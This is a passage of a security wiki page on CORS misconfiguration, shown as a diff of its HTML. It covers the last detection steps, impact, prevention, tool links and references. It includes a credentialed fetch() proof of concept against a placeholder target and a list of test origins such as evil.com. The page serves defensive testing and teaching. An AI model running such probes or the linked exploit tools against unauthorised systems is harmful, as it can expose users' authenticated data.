+</li>
+<li>
+<p><strong>Step 9: Browser PoC validation</strong></p>
+<pre tabindex="0"><code>fetch(&#34;https://target.com/api/data&#34;, {
+  credentials:&#34;include&#34;
+})
+</code></pre><p>→ Check if response data is accessible cross-origin</p>
+</li>
+<li>
+<p><strong>Step 10: Verify multiple origin acceptance</strong></p>
+<pre tabindex="0"><code>https://evil.com
+https://sub.target.com
+https://random.com
+</code></pre><p>→ If all are accepted → misconfigured CORS policy</p>
+</li>
+</ul>
+<h2 id="impact">
+  Impact
+  <a class="anchor" href="#impact">#</a>
+</h2>
+<ul>
+<li>Exposure of sensitive data to unauthorized external websites</li>
+<li>Unauthorized cross-origin access to authenticated user sessions</li>
+<li>Possibility of performing actions on behalf of users if credentials are included</li>
+<li>Session hijacking in misconfigured credential-based CORS setups</li>
+<li>Data leakage from APIs intended to be restricted to trusted origins</li>
+<li>Increased attack surface for client-side abuse and account compromise</li>
+<li>Violation of same-origin policy leading to loss of browser-level security boundaries</li>
+</ul>
+<h2 id="prevention">
+  Prevention
+  <a class="anchor" href="#prevention">#</a>
+</h2>
+<ul>
+<li>Allow only trusted origins instead of using wildcards ()</li>
+<li>Avoid reflecting the <code>Origin</code> header dynamically in <code>Access-Control-Allow-Origin</code></li>
+<li>Do not set <code>Access-Control-Allow-Credentials: true</code> unless absolutely required</li>
+<li>Maintain a strict whitelist of allowed domains on the server side</li>
+<li>Restrict allowed HTTP methods (GET, POST, etc.) based on business need</li>
+<li>Limit allowed headers using <code>Access-Control-Allow-Headers</code></li>
+<li>Disable CORS for internal/admin APIs exposed publicly</li>
+<li>Validate origin and authorization together before serving sensitive data</li>
+<li>Avoid exposing sensitive endpoints to cross-origin requests unnecessarily</li>
+</ul>
+<h2 id="tools">
+  Tools
+  <a class="anchor" href="#tools">#</a>
+</h2>
+<ul>
+<li><a href="https://github.com/s0md3v/Corsy/" target="_blank" rel="noreferrer noopener nofollow">s0md3v/Corsy</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"> - CORS Misconfiguration Scanner</li>
+<li><a href="https://github.com/chenjj/CORScanner" target="_blank" rel="noreferrer noopener nofollow">chenjj/CORScanner</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"> - Fast CORS misconfiguration vulnerabilities scanner</li>
+<li><a href="https://tools.honoki.net/postmessage.html" target="_blank" rel="noreferrer noopener nofollow">@honoki/PostMessage</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"> - POC Builder</li>
+<li><a href="https://github.com/trufflesecurity/of-cors" target="_blank" rel="noreferrer noopener nofollow">trufflesecurity/of-cors</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"> - Exploit CORS misconfigurations on the internal networks</li>
+<li><a href="https://github.com/omranisecurity/CorsOne" target="_blank" rel="noreferrer noopener nofollow">omranisecurity/CorsOne</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"> - Fast CORS Misconfiguration Discovery Tool</li>
+</ul>
+<h3 id="good-to-read">
+  Good to Read:
+  <a class="anchor" href="#good-to-read">#</a>
+</h3>
+<p><a href="https://www.bedefended.com/papers/cors-security-guide" target="_blank" rel="noreferrer noopener nofollow">www.bedefended.com</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
+<p><a href="https://hackerone.com/reports/2332728" target="_blank" rel="noreferrer noopener nofollow">https://hackerone.com/reports/2332728</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
+<p><a href="https://hackerone.com/reports/288912" target="_blank" rel="noreferrer noopener nofollow">https://hackerone.com/reports/288912</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
+<h2 id="references">
+  References
+  <a class="anchor" href="#references">#</a>
+</h2>
+<ul>
+<li><a href="https://infosecwriteups.com/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397" target="_blank" rel="noreferrer noopener nofollow">https://infosecwriteups.com/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://portswigger.net/web-security/cors" target="_blank" rel="noreferrer noopener nofollow">https://portswigger.net/web-security/cors</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://portswigger.net/web-security/cors/access-control-allow-origin" target="_blank" rel="noreferrer noopener nofollow">https://portswigger.net/web-security/cors/access-control-allow-origin</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers#CORS" target="_blank" rel="noreferrer noopener nofollow">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers#CORS</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties" target="_blank" rel="noreferrer noopener nofollow">https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://www.codecademy.com/articles/what-is-cors" target="_blank" rel="noreferrer noopener nofollow">https://www.codecademy.com/articles/what-is-cors</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://www.we45.com/blog/3-ways-to-exploit-misconfigured-cross-origin-resource-sharing-cors" target="_blank" rel="noreferrer noopener nofollow">https://www.we45.com/blog/3-ways-to-exploit-misconfigured-cross-origin-resource-sharing-cors</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://medium.com/netscape/hacking-it-out-when-cors-wont-let-you-be-great-35f6206cc646" target="_blank" rel="noreferrer noopener nofollow">https://medium.com/netscape/hacking-it-out-when-cors-wont-let-you-be-great-35f6206cc646</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration" target="_blank" rel="noreferrer noopener nofollow">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://medium.com/entersoftsecurity/every-bug-bounty-hunter-should-know-the-evil-smile-of-the-jsonp-over-the-browsers-same-origin-438af3a0ac3b" target="_blank" rel="noreferrer noopener nofollow">https://medium.com/entersoftsecurity/every-bug-bounty-hunter-should-know-the-evil-smile-of-the-jsonp-over-the-browsers-same-origin-438af3a0ac3b</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://web.archive.org/web/20190516052453/https://www.corben.io/advanced-cors-techniques/" target="_blank" rel="noreferrer noopener nofollow">Advanced CORS Exploitation Techniques - Corben Leo - June 16, 2018</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://hackerone.com/reports/426147" target="_blank" rel="noreferrer noopener nofollow">CORS misconfig | Account Takeover - Rohan (nahoragg) - October 20, 2018</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://hackerone.com/reports/430249" target="_blank" rel="noreferrer noopener nofollow">CORS Misconfiguration leading to Private Information Disclosure - sandh0t (sandh0t) - October 29, 2018</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://hackerone.com/reports/168574" target="_blank" rel="noreferrer noopener nofollow">CORS Misconfiguration on www.zomato.com - James Kettle (albinowax) - September 15, 2016</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://blog.detectify.com/2018/04/26/cors-misconfigurations-explained/" target="_blank" rel="noreferrer noopener nofollow">CORS Misconfigurations Explained - Detectify Blog - April 26, 2018</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://portswigger.net/web-security/cors" target="_blank" rel="noreferrer noopener nofollow">Cross-origin resource sharing (CORS) - PortSwigger Web Security Academy - December 30, 2019</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://hackerone.com/reports/235200" target="_blank" rel="noreferrer noopener nofollow">Cross-origin resource sharing misconfig | steal user information - bughunterboy (bughunterboy) - June 1, 2017</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://portswigger.net/blog/exploiting-cors-misconfigurations-for-bitcoins-and-bounties" target="_blank" rel="noreferrer noopener nofollow">Exploiting CORS misconfigurations for Bitcoins and bounties - James Kettle - 14 October 2016</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://www.geekboy.ninja/blog/exploiting-misconfigured-cors-cross-origin-resource-sharing/" target="_blank" rel="noreferrer noopener nofollow">Exploiting Misconfigured CORS (Cross Origin Resource Sharing) - Geekboy - December 16, 2016</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397" target="_blank" rel="noreferrer noopener nofollow">Think Outside the Scope: Advanced CORS Exploitation Techniques - Ayoub Safa (Sandh0t) - May 14 2019</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+</ul>
+</article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+
+  <div><a class="flex align-center" href="https://github.com/payatu/cybersec-wiki/commit/930cd58c048c49a6cd3c5045ba784f0e26bd6d68" title='Last modified by Suraj Kumar | August 13, 2026' target="_blank" rel="noopener">
+      <img src="/svg/calendar.svg" class="book-icon" alt="Calendar" />
+      <span>August 13, 2026</span>
+    </a>
+  </div>
+
+
+
+  <div>
+    <a class="flex align-center" href="https://github.com/payatu/cybersec-wiki/edit/main/content/docs/application-security/web/CORS.md" target="_blank" rel="noopener">
+      <img src="/svg/edit.svg" class="book-icon" alt="Edit" />
+      <span>Edit this page</span>
+    </a>
+  </div>
+
+
+</div>
+
+
+
+  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>
+
+
+ 
+        
+      </footer>
+
+      
+  
+  <div class="book-comments">
+
+</div>
+  
+ 
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+    <aside class="book-toc">
+      <div class="book-toc-content">
+        
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#cors">CORS</a>
+      <ul>
+        <li><a href="#what-is-cors">What is CORS?</a></li>
+        <li><a href="#how-cors-works-high-level-flow">How CORS Works (High-Level Flow)</a></li>
+        <li><a href="#sop">SOP</a></li>
+        <li><a href="#key-http-headers-in-cors">Key HTTP Headers in CORS</a>
+          <ul>
+            <li><a href="#origin-request-header">Origin (Request Header)</a></li>
+            <li><a href="#access-control-allow-origin-response-header">Access-Control-Allow-Origin (Response Header)</a></li>
+            <li><a href="#access-control-allow-credentials-response-header">Access-Control-Allow-Credentials (Response Header)</a></li>
+          </ul>
+        </li>
+        <li><a href="#attack-surfaces">Attack Surfaces</a>
+          <ul>
+            <li><a href="#origin-based-attack-surface">Origin-Based Attack Surface</a></li>
+            <li><a href="#credentialed-attack-surface">Credentialed Attack Surface</a></li>
+            <li><a href="#preflight-attack-surface">Preflight Attack Surface</a></li>
+          </ul>
+        </li>
+        <li><a href="#testing-for-cors-misconfiguration">Testing for CORS Misconfiguration</a></li>
+        <li><a href="#exploiting-cors-misconfigurations">Exploiting CORS Misconfigurations</a>
+          <ul>
+            <li><a href="#origin-reflection">Origin Reflection:</a></li>
+            <li><a href="#whitelisted-null-origin">Whitelisted null origin</a></li>
+            <li><a href="#xss-on-trusted-origin">XSS on Trusted Origin</a></li>
+            <li><a href="#wildcard-origin-without-credentials">Wildcard Origin without credentials</a></li>
+            <li><a href="#weak-regular-expression-bypass">Weak Regular Expression Bypass</a></li>
+            <li><a href="#advance-regular-expression-bypass">Advance Regular Expression Bypass</a></li>
+            <li><a href="#xssijsonp-bypass">XSSI/JSONP Bypass</a></li>
+            <li><a href="#iframe--popup-bypass">Iframe + Popup Bypass</a></li>
+          </ul>
+        </li>
+        <li><a href="#detection"><strong>Detection</strong></a></li>
+        <li><a href="#impact">Impact</a></li>
+        <li><a href="#prevention">Prevention</a></li>
+        <li><a href="#tools">Tools</a>
+          <ul>
+            <li><a href="#good-to-read">Good to Read:</a></li>
+          </ul>
+        </li>
+        <li><a href="#references">References</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+ 
+      </div>
+    </aside>
+    
+  </main>
+
+  
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
